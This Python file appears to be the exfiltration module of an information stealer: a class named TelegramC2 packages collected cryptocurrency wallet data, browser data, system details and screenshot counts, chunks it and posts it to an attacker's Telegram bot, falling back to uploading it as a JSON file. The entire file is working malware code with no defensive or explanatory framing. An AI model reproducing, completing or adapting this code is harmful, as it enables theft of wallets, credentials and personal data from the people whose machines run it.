import aiohttp
import asyncio
import json
import os
from cryptography.fernet import Fernet

class TelegramC2:
    def __init__(self):
        self.session = None
    
    async def send_to_telegram(self, data, bot_token, chat_id):
        try:
            async with aiohttp.ClientSession() as session:
                formatted_data = self.format_crypto_data(data)
                chunks = self.chunk_data(formatted_data)
                
                for chunk in chunks:
                    payload = {
                        "chat_id": chat_id,
                        "text": f"```json\n{chunk}\n```",
                        "parse_mode": "MarkdownV2"
                    }
                    
                    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                    async with session.post(url, json=payload, timeout=30) as response:
                        if response.status != 200:
                            await self.send_as_document(data, bot_token, chat_id, session)
                            break
        except Exception as e:
            print(f"Telegram error: {e}")
    
    async def send_as_document(self, data, bot_token, chat_id, session):
        try:
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
                temp_path = f.name
            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
            data_form = aiohttp.FormData()
            data_form.add_field('chat_id', chat_id)
            data_form.add_field('document', open(temp_path, 'rb'))
            
            async with session.post(url, data=data_form) as response:
                pass
            os.unlink(temp_path)
        except Exception as e:
            print(f"Document upload failed: {e}")
    
    def format_crypto_data(self, data):
        formatted = {
            "summary": {
                "wallets_found": len(data.get("wallets", {})),
                "browsers_scanned": len(data.get("browsers", {})),
                "system": data.get("system_info", {})
            },
            "wallets": data.get("wallets", {}),
            "browsers": data.get("browsers", {}),
            "screenshots_count": len(data.get("screenshots", []))
        }
        return formatted
    
    def chunk_data(self, data, chunk_size=4000):
        data_str = json.dumps(data, indent=2, ensure_ascii=False)
        chunks = []
        
        for i in range(0, len(data_str), chunk_size):
            chunk = data_str[i:i + chunk_size]
            chunk = self.escape_markdown(chunk)
            chunks.append(chunk)
        
        return chunks
    
    def escape_markdown(self, text):
        escape_chars = '_*[]()~`>#+-=|{}.!'
        for char in escape_chars:
            text = text.replace(char, f'\\{char}')
        return text

async def send_to_telegram(data, bot_token, chat_id):
    c2 = TelegramC2()
    await c2.send_to_telegram(data, bot_token, chat_id)